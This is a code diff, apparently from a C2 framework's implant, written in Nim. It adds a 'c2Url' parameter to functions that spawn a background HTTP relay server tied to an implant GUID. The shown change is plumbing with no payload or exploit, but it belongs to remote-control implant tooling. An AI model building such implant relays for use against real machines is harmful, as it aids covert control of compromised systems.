@@ -14,19 +14,19 @@ var g_relayServerStarted: bool = false
 var g_relayServerPort: int = 0
 
 # Background proc to run relay server (non-blocking)
-proc runRelayServerInBackground(port: int, implantGuid: string) =
+proc runRelayServerInBackground(port: int, implantGuid: string, c2Url: string) =
     when defined debug:
         echo "[RELAY] 🔧 Background thread starting relay server on port " & $port
     try:
         # startRelayServer is async, need to wait for it
-        waitFor http_relay.startRelayServer(port, implantGuid)
+        waitFor http_relay.startRelayServer(port, implantGuid, c2Url)
     except Exception as e:
         when defined debug:
             echo "[RELAY] ❌ Background relay server crashed: " & e.msg
 
 # Start HTTP relay server with dynamic port (runtime command)
 # Returns immediately after spawning background server
-proc startRelayServerWithPort*(port: int, implantGuid: string): bool =
+proc startRelayServerWithPort*(port: int, implantGuid: string, c2Url: string = ""): bool =
     # Idempotent guard: return early if already started
     if g_relayServerStarted:
         when defined debug:
@@ -41,10 +41,10 @@ proc startRelayServerWithPort*(port: int, implantGuid: string): bool =
     try:
         # Spawn background thread
         when compileOption("threads"):
-            spawn runRelayServerInBackground(port, implantGuid)
+            spawn runRelayServerInBackground(port, implantGuid, c2Url)
         else:
             # Fallback: start in current thread (will block, but at least works)
-            runRelayServerInBackground(port, implantGuid)
+            runRelayServerInBackground(port, implantGuid, c2Url)
         
         g_relayServerStarted = true  # Mark as started
         g_relayServerPort = port
